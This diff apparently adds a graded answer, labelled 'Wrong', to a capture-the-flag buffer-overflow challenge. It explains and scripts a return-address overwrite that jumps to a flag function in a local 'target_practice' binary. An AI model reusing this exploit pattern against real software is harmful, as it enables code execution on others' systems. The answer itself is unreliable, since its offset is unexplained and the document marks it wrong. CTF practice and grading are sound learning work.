@@ -1,0 +1,32 @@
+(Wrong)
+
+
+This is a buffer overflow vulnerability. The program takes an input from the user, but it does not check the length of the input before using it. Therefore, we can overflow the buffer and execute arbitrary code.
+
+To solve this challenge, we need to find a way to execute the flag function. We can do this by overflowing the buffer and overwriting the return address to point to the flag function.
+
+Here is the solution in Python:
+
+```python
+import struct
+
+# Get the address of the flag function
+flag_address = 0x4007cc
+
+# Calculate the offset to the return address on the stack
+offset = 0x18 + 0x10 + 0x8
+
+# Create the payload to overflow the buffer and overwrite the return address
+payload = b"A"*offset + struct.pack("<Q", flag_address)
+
+# Call the target_practice executable with the payload as input
+import subprocess
+process = subprocess.Popen(['./target_practice'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+process.stdin.write(payload)
+output, error = process.communicate()
+print(output.decode())
+```
+
+Explanation:
+
+We first get the address of the flag function by searching for its symbol in the binary (for example, using the `nm` command). We then calculate the offset to the return address on the stack, which is the distance between the beginning of the buffer and the return address. We create the payload by filling it with the necessary amount of padding (`'A'*offset`) and then adding the flag function address in little endian format (`struct.pack("<Q", flag_address)`). Finally, we call the target_practice executable with the payload as input using `subprocess.Popen` and print the output. 
